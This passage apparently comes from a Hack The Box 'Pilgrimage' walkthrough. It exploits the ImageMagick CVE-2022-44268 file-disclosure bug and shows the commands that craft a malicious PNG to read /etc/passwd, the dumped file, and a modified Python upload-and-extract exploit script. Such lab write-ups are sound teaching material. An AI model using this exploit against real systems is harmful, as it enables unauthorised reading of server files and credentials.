  <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span><span class="nv">$password</span><span class="p">));</span>

  <span class="k">if</span><span class="p">(</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">())</span> <span class="p">{</span>
    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /dashboard.php"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /login.php?message=Login failed&amp;status=fail"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></div>

Here is leaked the database directory path and how the website is interacting with the database. At first glance, everything looks very good, as it is using secure functions for interaction.<br/><br/>
<h3><br>ImageMagick - LFI</br></h3><br>
Let's take a loot at the binary:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">magick</span>
<span class="n">Error</span><span class="p">:</span> <span class="n">Invalid</span> <span class="n">argument</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">enough</span> <span class="n">arguments</span>

<span class="n">Usage</span><span class="p">:</span> <span class="n">magick</span> <span class="n">tool</span> <span class="p">[</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">image</span><span class="p">}</span> <span class="o">...</span> <span class="p">]</span> <span class="p">{</span><span class="n">output_image</span><span class="p">}</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">magick</span> <span class="p">[</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">image</span><span class="p">}</span> <span class="o">...</span> <span class="p">]</span> <span class="p">{</span><span class="n">output_image</span><span class="p">}</span>
       <span class="n">magick</span> <span class="p">[</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span> <span class="o">|</span> <span class="p">{</span><span class="n">image</span><span class="p">}</span> <span class="o">...</span> <span class="p">]</span> <span class="o">-</span><span class="n">script</span> <span class="p">{</span><span class="n">filename</span><span class="p">}</span> <span class="p">[</span> <span class="p">{</span><span class="n">script_args</span><span class="p">}</span> <span class="o">...</span><span class="p">]</span>
       <span class="n">magick</span> <span class="o">-</span><span class="n">help</span> <span class="o">|</span> <span class="o">-</span><span class="n">version</span> <span class="o">|</span> <span class="o">-</span><span class="n">usage</span> <span class="o">|</span> <span class="o">-</span><span class="nb">list</span> <span class="p">{</span><span class="n">option</span><span class="p">}</span>
<span class="nd">elswix@kali</span><span class="err">$</span> <span class="o">./</span><span class="n">magick</span> <span class="o">-</span><span class="n">version</span>
<span class="n">Version</span><span class="p">:</span> <span class="n">ImageMagick</span> <span class="mf">7.1.0</span><span class="o">-</span><span class="mi">49</span> <span class="n">beta</span> <span class="n">Q16</span><span class="o">-</span><span class="n">HDRI</span> <span class="n">x86_64</span> <span class="n">c243c9281</span><span class="p">:</span><span class="mi">20220911</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">imagemagick</span><span class="o">.</span><span class="n">org</span>
<span class="n">Copyright</span><span class="p">:</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mi">1999</span> <span class="n">ImageMagick</span> <span class="n">Studio</span> <span class="n">LLC</span>
<span class="n">License</span><span class="p">:</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">imagemagick</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">script</span><span class="o">/</span><span class="n">license</span><span class="o">.</span><span class="n">php</span>
<span class="n">Features</span><span class="p">:</span> <span class="n">Cipher</span> <span class="n">DPC</span> <span class="n">HDRI</span> <span class="n">OpenMP</span><span class="p">(</span><span class="mf">4.5</span><span class="p">)</span> 
<span class="n">Delegates</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">):</span> <span class="n">bzlib</span> <span class="n">djvu</span> <span class="n">fontconfig</span> <span class="n">freetype</span> <span class="n">jbig</span> <span class="n">jng</span> <span class="n">jpeg</span> <span class="n">lcms</span> <span class="n">lqr</span> <span class="n">lzma</span> <span class="n">openexr</span> <span class="n">png</span> <span class="n">raqm</span> <span class="n">tiff</span> <span class="n">webp</span> <span class="n">x</span> <span class="n">xml</span> <span class="n">zlib</span>
<span class="n">Compiler</span><span class="p">:</span> <span class="n">gcc</span> <span class="p">(</span><span class="mf">7.5</span><span class="p">)</span>
<span class="nd">elswix@kali</span><span class="err">$</span>
</pre></div>

It is an ImageMagick binary, specifically ImageMagick version 7.1.0-49.<br/><br/>
ImageMagick is an open-source software suite designed for the creation, editing, conversion, and manipulation of images. It supports a wide range of image formats and provides a versatile set of tools and utilities for tasks such as resizing, cropping, rotating, and applying various effects to images.<br/><br/>
Let's search on the internet vulnerabilities associated to this ImageMagick version.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/11.png"/><br/><br/>
ImageMagick 7.1.0-49 is susceptible to an Information Disclosure vulnerability. When ImageMagick processes a PNG image, such as during a resize operation, the resulting image might contain the content of any arbitrary file. This occurs if the <code>magick</code> binary has the necessary permissions to read the arbitrary file.<br/><br/>
I found lots of LFI PoC to exploit this version of ImageMagick. I cloned this <a href="https://github.com/kljunowsky/CVE-2022-44268">repository</a> and tried to exploit this vulnerability. <br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">-</span><span class="n">h</span>
<span class="n">usage</span><span class="p">:</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="p">[</span><span class="o">-</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">url</span> <span class="n">URL</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">image</span> <span class="n">IMAGE</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="n">FILE_TO_READ</span><span class="p">]</span> <span class="p">[</span><span class="o">--</span><span class="n">output</span> <span class="n">OUTPUT</span><span class="p">]</span>

<span class="n">Proof</span> <span class="n">of</span> <span class="n">Concept</span> <span class="n">Exploit</span> <span class="k">for</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mi">44268</span> <span class="n">by</span> <span class="n">Milan</span> <span class="n">Jovic</span> <span class="o">-</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">shiftsecurityconsulting</span><span class="o">.</span><span class="n">com</span>

<span class="n">options</span><span class="p">:</span>
  <span class="o">-</span><span class="n">h</span><span class="p">,</span> <span class="o">--</span><span class="n">help</span>            <span class="n">show</span> <span class="n">this</span> <span class="n">help</span> <span class="n">message</span> <span class="ow">and</span> <span class="n">exit</span>
  <span class="o">--</span><span class="n">url</span> <span class="n">URL</span>             <span class="n">The</span> <span class="n">URL</span> <span class="n">of</span> <span class="n">the</span> <span class="n">uploaded</span> <span class="n">PNG</span> <span class="n">image</span>
  <span class="o">--</span><span class="n">image</span> <span class="n">IMAGE</span>         <span class="n">Input</span> <span class="n">PNG</span> <span class="n">file</span>
  <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="n">FILE_TO_READ</span>
                        <span class="n">File</span> <span class="n">to</span> <span class="n">read</span>
  <span class="o">--</span><span class="n">output</span> <span class="n">OUTPUT</span>       <span class="n">Output</span> <span class="n">PNG</span> <span class="n">file</span>
</pre></div>

It is easy to use, first you have to create a malicious image, so we will use <code>--image</code>, <code>--file-to-read</code> and <code>--output</code> parameters. <br/><br/>
For this, I downloaded a random PNG image from the internet and created the malicious file:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">image</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span> <span class="o">--</span><span class="n">file</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">read</span> <span class="s2">"/etc/passwd"</span> <span class="o">--</span><span class="n">output</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">l</span>
<span class="n">total</span> <span class="mi">112</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>  <span class="mi">1779</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">14</span><span class="p">:</span><span class="mi">18</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>   <span class="mi">232</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">14</span><span class="p">:</span><span class="mi">18</span> <span class="n">Dockerfile</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>  <span class="mi">1455</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">14</span><span class="p">:</span><span class="mi">18</span> <span class="n">README</span><span class="o">.</span><span class="n">md</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span> <span class="mi">41427</span> <span class="n">Nov</span> <span class="mi">30</span>  <span class="mi">2014</span> <span class="n">example</span><span class="o">.</span><span class="n">png</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span> <span class="mi">50458</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">14</span><span class="p">:</span><span class="mi">21</span> <span class="n">malicious</span><span class="o">.</span><span class="n">png</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">elswix</span> <span class="n">elswix</span>    <span class="mi">47</span> <span class="n">Nov</span> <span class="mi">28</span> <span class="mi">14</span><span class="p">:</span><span class="mi">18</span> <span class="n">requirements</span><span class="o">.</span><span class="n">txt</span>
</pre></div>

Now, we have to upload the <code>malicious.png</code> file to the website to exploit the vulnerability.<br/><br/>
<img alt="" src="https://elswix.github.io/writeups/htb/easy/pilgrimage/img/12.png"/><br/><br/>
Once uploaded, we can use the <code>--url</code> parameter to specify the URL where the converted image is saved and read the file content:<br/><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">CVE</span><span class="o">-</span><span class="mi">2022</span><span class="o">-</span><span class="mf">44268.</span><span class="n">py</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span><span class="mi">656621</span><span class="n">fa207ff</span><span class="o">.</span><span class="n">png</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="nb">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="nb">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_apt</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">messagebus</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">109</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="mi">110</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">emily</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">emily</span><span class="p">,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">emily</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">coredump</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="mi">999</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Core</span> <span class="n">Dumper</span><span class="p">:</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sshd</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">_laurel</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">998</span><span class="p">:</span><span class="mi">998</span><span class="p">::</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">laurel</span><span class="p">:</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">false</span>
</pre></div>

Finally, we obtained the <code>/etc/passwd</code> file of the victim machine. <br/><br/>
<h3><br>Shell as emily</br></h3><br>
To automate the uploading process, I modified the script:<br/><br/>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">argparse</span><span class="o">,</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">io</span><span class="o">,</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">PngImagePlugin</span>


<span class="k">def</span> <span class="nf">uploadMaliciousImage</span><span class="p">():</span>

        <span class="n">upload_url</span> <span class="o">=</span> <span class="s2">"http://pilgrimage.htb/index.php"</span>
        <span class="n">fileToUpload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'toConvert'</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">,</span> <span class="s2">"rb"</span><span class="p">)}</span> 
        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">upload_url</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">fileToUpload</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
        <span class="n">newImageUrl</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">'Location'</span><span class="p">]</span>
        <span class="n">regex</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">'message=(.*?)&amp;'</span>
        <span class="n">newImageUrl</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">newImageUrl</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>


        <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">newImageUrl</span><span class="p">)</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">))</span>

        <span class="c1"># Extract the raw profile type from the image metadata</span>
        <span class="n">raw_profile_type</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'Raw profile type'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)[</span><span class="mi">3</span><span class="p">:]</span>
        <span class="n">raw_profile_type_stipped</span> <span class="o">=</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">raw_profile_type</span><span class="p">)</span>

        <span class="c1"># Decrypt the raw profile type from hex format</span>
        <span class="n">decrypted_profile_type</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">raw_profile_type_stipped</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-8'</span><span class="p">)</span>

        <span class="c1"># Print the decrypted profile type</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">decrypted_profile_type</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">maliciousImage</span><span class="p">():</span>
        <span class="c1"># Open the image file</span>
        <span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">image</span><span class="p">)</span>

        <span class="c1"># Create a PngInfo object and add the text</span>
        <span class="n">info</span> <span class="o">=</span> <span class="n">PngImagePlugin</span><span class="o">.</span><span class="n">PngInfo</span><span class="p">()</span>
        <span class="n">info</span><span class="o">.</span><span class="n">add_text</span><span class="p">(</span><span class="s1">'profile'</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">file_to_read</span><span class="p">,</span> <span class="nb">zip</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

        <span class="c1"># Save the modified image to a new file</span>
        <span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">output</span><span class="p">,</span> <span class="s1">'PNG'</span><span class="p">,</span> <span class="n">pnginfo</span><span class="o">=</span><span class="n">info</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">maliciousImage</span><span class="p">()</span>
    <span class="n">uploadMaliciousImage</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">'Proof of Concept Exploit for CVE-2022-44268 by Milan Jovic - https://shiftsecurityconsulting.com'</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--url'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">'The URL to upload the image'</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--image'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">'Input PNG file'</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--file-to-read'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">'File to read'</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">'--output'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">'Output PNG file'</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nb">vars</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
        <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>

With this modification, there's no need to use the <code>--url</code> parameter; the upload process is automated. For example, let's attempt to read the <code>/etc/hosts</code> file:<br/><br/>
